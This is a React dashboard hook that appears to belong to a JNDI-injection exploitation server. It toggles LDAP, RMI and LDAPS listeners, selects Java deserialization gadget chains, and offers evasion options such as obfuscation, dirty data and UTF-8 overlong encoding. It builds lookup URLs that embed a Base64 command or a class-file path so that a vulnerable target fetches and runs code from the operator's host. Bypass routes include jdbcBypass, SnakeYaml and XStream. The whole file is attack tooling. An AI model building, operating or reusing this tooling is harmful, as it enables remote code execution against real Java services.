import { useState, useEffect, useMemo, useCallback, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  getStatus, toggleServer, getGadgets,
  generatePayload as apiGenerate, updateConfig, setAuthToken, getLogs,
  getFiles, downloadFile, deleteFile as apiDeleteFile,
  uploadFile
} from '../api'

const ROUTING_OPTIONS = ['Basic', 'ELProcessor', 'Groovy', 'jdbcBypass1', 'jdbcBypass2', 'ldap2rmi', 'SnakeYaml', 'XStream', 'MemoryXXE']

const DEFAULT_CONFIG = {
  ip: '', ldapPort: 1389, ldapsPort: 1669, httpPort: 3456, rmiPort: 1099,
  AESkey: '123', user: '', PASSWD: '', TLSProxy: false, keyPass: '', certFile: ''
}

export default function useDashboard() {
  const navigate = useNavigate()
  const [mode, setMode] = useState('jndi')
  const [animKey, setAnimKey] = useState(0)
  const [status, setStatus] = useState({})
  const [loading, setLoading] = useState(false)
  const [toggling, setToggling] = useState(null)
  const [activeJndiTab, setActiveJndiTab] = useState('config')
  const [gadgets, setGadgets] = useState([])
  const [gadgetSearch, setGadgetSearch] = useState('')
  const [selectedGadget, setSelectedGadget] = useState('')
  const [payloadCmd, setPayloadCmd] = useState('')
  const [payloadResult, setPayloadResult] = useState('')
  const [encodeBase64, setEncodeBase64] = useState(true)
  const [showAdvanced, setShowAdvanced] = useState(false)
  const [inherit, setInherit] = useState(false)
  const [obscure, setObscure] = useState(false)
  const [dcfp, setDcfp] = useState('')
  const [dirtyType, setDirtyType] = useState('')
  const [dirtyLength, setDirtyLength] = useState('')
  const [noComSun, setNoComSun] = useState(false)
  const [mozillaClassLoader, setMozillaClassLoader] = useState(false)
  const [rhino, setRhino] = useState(false)
  const [utf8Overlong, setUtf8Overlong] = useState(false)
  const [payloadSubTab, setPayloadSubTab] = useState('gadget')
  const [gadgetOpen, setGadgetOpen] = useState(false)
  const [jndiPayloadResult, setJndiPayloadResult] = useState('')
  const [rmiPayloadResult, setRmiPayloadResult] = useState('')
  const [ldapsPayloadResult, setLdapsPayloadResult] = useState('')
  const [jndiGadgetInput, setJndiGadgetInput] = useState('')
  const [gadgetModeInput, setGadgetModeInput] = useState('')
  const [saveFilename, setSaveFilename] = useState('')
  const [filePath, setFilePath] = useState('')
  const [classLoaderResult, setClassLoaderResult] = useState('')
  const [rmiClassLoaderResult, setRmiClassLoaderResult] = useState('')
  const [ldapsClassLoaderResult, setLdapsClassLoaderResult] = useState('')
  const [routing, setRouting] = useState('ELProcessor')
  const [routingOpen, setRoutingOpen] = useState(false)
  const [logLines, setLogLines] = useState([])
  const [logLoading, setLogLoading] = useState(false)
  const logEndRef = useRef(null)
  const [files, setFiles] = useState([])
  const [filesLoading, setFilesLoading] = useState(false)
  const [dragOver, setDragOver] = useState(false)
  const [uploading, setUploading] = useState(false)
  const fileInputRef = useRef(null)
  const [configForm, setConfigForm] = useState({ ...DEFAULT_CONFIG })

  const filteredGadgets = useMemo(() => {
    if (!gadgetSearch) return gadgets
    return gadgets.filter(g => g.name.toLowerCase().includes(gadgetSearch.toLowerCase()))
  }, [gadgetSearch, gadgets])

  const switchMode = useCallback((next) => {
    if (next === mode) return
    setMode(next)
    setAnimKey(k => k + 1)
  }, [mode])

  async function loadStatus() {
    try {
      const res = await getStatus()
      setStatus(res.data)
      setConfigForm(prev => ({
        ...prev,
        ip: res.data.ip || '',
        ldapPort: res.data.ldapPort || 1389,
        ldapsPort: res.data.ldapsPort || 1669,
        httpPort: res.data.httpPort || 3456,
        rmiPort: res.data.rmiPort || 1099,
        AESkey: res.data.AESkey || '123',
        user: res.data.user || '',
        PASSWD: res.data.PASSWD || '',
        TLSProxy: res.data.TLSProxy || false,
        keyPass: res.data.keyPass || '',
        certFile: res.data.certFile || ''
      }))
    } catch (e) {
      if (e.response && e.response.status === 401) {
        setAuthToken(null)
        navigate('/login', { replace: true })
      }
    }
  }

  async function loadGadgets() {
    try {
      const res = await getGadgets()
      setGadgets(res.data)
    } catch (e) { /* ignore */ }
  }

  async function handleToggleServer(server) {
    setToggling(server)
    try {
      const res = await toggleServer(server)
      if (res.data.success) {
        setStatus(res.data.status)
      }
    } catch (e) { /* ignore */ }
    finally { setToggling(null) }
  }

  async function handleSaveConfig() {
    setLoading(true)
    try {
      await updateConfig(configForm)
      loadStatus()
    } catch (e) { /* ignore */ }
    finally { setLoading(false) }
  }

  async function handleGeneratePayload() {
    const gadgetName = (gadgetModeInput || selectedGadget || '').trim()
    if (!gadgetName) return
    setLoading(true)
    try {
      const res = await apiGenerate({ gadget: gadgetName, command: payloadCmd, filename: saveFilename, encodeBase64,
        inherit, obscure, dcfp, dirtyType, dirtyLength, noComSun, mozillaClassLoader, rhino, utf8Overlong })
      if (res.data.success) {
        setPayloadResult(res.data.message || 'Payload generated successfully')
        if (res.data.saved) fetchFiles()
      } else {
        setPayloadResult('Error: ' + (res.data.error || 'unknown'))
      }
    } catch (e) {
      setPayloadResult(e.response?.data?.error || 'Failed to generate payload')
    } finally { setLoading(false) }
  }

  function handleGenerateJndiPayload() {
    const gadgetName = (jndiGadgetInput || selectedGadget || '').trim()
    if (!gadgetName || !payloadCmd) return
    setLoading(true)
    setJndiPayloadResult('')
    setRmiPayloadResult('')
    setLdapsPayloadResult('')
    try {
      const bytes = new TextEncoder().encode(payloadCmd)
      const cmdB64 = btoa(String.fromCharCode.apply(null, bytes))
      const ipAddr = configForm.ip || '0.0.0.0'
      const ldapPort = configForm.ldapPort || 1389
      const rmiPort = configForm.rmiPort || 1099
      const ldapsPort = configForm.ldapsPort || 1669

      setJndiPayloadResult(`ldap://${ipAddr}:${ldapPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`)
      setRmiPayloadResult(`rmi://${ipAddr}:${rmiPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`)
      setLdapsPayloadResult(`ldaps://${ipAddr}:${ldapsPort}/Deserialization/${gadgetName}/command/Base64/${cmdB64}`)
    } catch (e) { /* ignore */ }
    finally { setLoading(false) }
  }

  function handleGenerateClassLoader() {
    const fp = filePath.trim()
    const route = routing.trim()
    if (!fp || !route) return
    setLoading(true)
    setClassLoaderResult('')
    setRmiClassLoaderResult('')
    setLdapsClassLoaderResult('')
    if (!fp.toLowerCase().endsWith('.class')) {
      setLoading(false)
      return
    }
    try {
      const ipAddr = configForm.ip || '0.0.0.0'
      const ldapPort = configForm.ldapPort || 1389
      const rmiPort = configForm.rmiPort || 1099
      const ldapsPort = configForm.ldapsPort || 1669

      setClassLoaderResult(`ldap://${ipAddr}:${ldapPort}/${route}/M-LF-${fp}`)
      setRmiClassLoaderResult(`rmi://${ipAddr}:${rmiPort}/${route}/M-LF-${fp}`)
      setLdapsClassLoaderResult(`ldaps://${ipAddr}:${ldapsPort}/${route}/M-LF-${fp}`)
    } catch (e) { /* ignore */ }
    finally { setLoading(false) }
  }

  function logout() {
    setAuthToken(null)
    navigate('/login', { replace: true })
  }

  async function fetchLogs() {
    setLogLoading(true)
    try {
      const res = await getLogs(100)
      setLogLines(res.data.logs || [])
    } catch { /* ignore */ }
    finally { setLogLoading(false) }
  }

  useEffect(() => { loadStatus(); loadGadgets() }, [])

  useEffect(() => {
    if (mode !== 'gadget') return
    fetchFiles()
  }, [mode])

  async function fetchFiles() {
    setFilesLoading(true)
    try {
      const res = await getFiles()
      setFiles(res.data)
    } catch { /* ignore */ }
    finally { setFilesLoading(false) }
  }

  async function handleDownloadFile(name) {
    try {
      const res = await downloadFile(name)
      const url = window.URL.createObjectURL(new Blob([res.data]))
      const a = document.createElement('a')
      a.href = url
      a.download = name
      a.click()
      window.URL.revokeObjectURL(url)
    } catch { /* ignore */ }
  }

  async function handleDeleteFile(name) {
    if (!confirm(`Delete ${name}?`)) return
    try {
      await apiDeleteFile(name)
      fetchFiles()
    } catch { /* ignore */ }
  }

  function handleDragOver(e) {
    e.preventDefault()
    e.stopPropagation()
    setDragOver(true)
  }

  function handleDragLeave(e) {
    e.preventDefault()
    e.stopPropagation()
    setDragOver(false)
  }

  function handleDrop(e) {
    e.preventDefault()
    e.stopPropagation()
    setDragOver(false)
    const droppedFiles = e.dataTransfer.files
    if (droppedFiles.length > 0) {
      doUpload(droppedFiles[0])
    }
  }

  function handleFileSelect(e) {
    const selectedFiles = e.target.files
    if (selectedFiles.length > 0) {
      doUpload(selectedFiles[0])
    }
    e.target.value = ''
  }

  async function doUpload(file) {
    setUploading(true)
    try {
      const formData = new FormData()
      formData.append('file', file)
      const res = await uploadFile(formData)
      if (res.data.success) {
        fetchFiles()
      }
    } catch (e) { /* ignore */ }
    finally {
      setUploading(false)
    }
  }

  useEffect(() => {
    if (activeJndiTab !== 'logs') return
    fetchLogs()
    const id = setInterval(fetchLogs, 2000)
    return () => clearInterval(id)
  }, [activeJndiTab])

  useEffect(() => {
    if (logEndRef.current) logEndRef.current.scrollIntoView({ behavior: 'smooth' })
  }, [logLines])

  return {
    mode, animKey, switchMode,
    status, toggling, handleToggleServer,
    activeJndiTab, setActiveJndiTab,
    gadgets, gadgetSearch, setGadgetSearch, selectedGadget, setSelectedGadget, filteredGadgets,
    payloadCmd, setPayloadCmd, payloadResult, setPayloadResult,
    encodeBase64, setEncodeBase64,
    showAdvanced, setShowAdvanced,
    inherit, setInherit, obscure, setObscure,
    dcfp, setDcfp, dirtyType, setDirtyType, dirtyLength, setDirtyLength,
    noComSun, setNoComSun, mozillaClassLoader, setMozillaClassLoader,
    rhino, setRhino, utf8Overlong, setUtf8Overlong,
    payloadSubTab, setPayloadSubTab,
    gadgetOpen, setGadgetOpen,
    jndiPayloadResult, rmiPayloadResult, ldapsPayloadResult,
    jndiGadgetInput, setJndiGadgetInput,
    gadgetModeInput, setGadgetModeInput,
    saveFilename, setSaveFilename,
    filePath, setFilePath,
    classLoaderResult, rmiClassLoaderResult, ldapsClassLoaderResult,
    routing, setRouting, routingOpen, setRoutingOpen, ROUTING_OPTIONS,
    logLines, logLoading, fetchLogs, logEndRef,
    files, filesLoading, fetchFiles,
    dragOver, setDragOver, uploading, fileInputRef,
    configForm, setConfigForm,
    loading, setLoading,
    handleSaveConfig, handleGeneratePayload, handleGenerateJndiPayload, handleGenerateClassLoader,
    logout,
    handleDownloadFile, handleDeleteFile,
    handleDragOver, handleDragLeave, handleDrop, handleFileSelect
  }
}
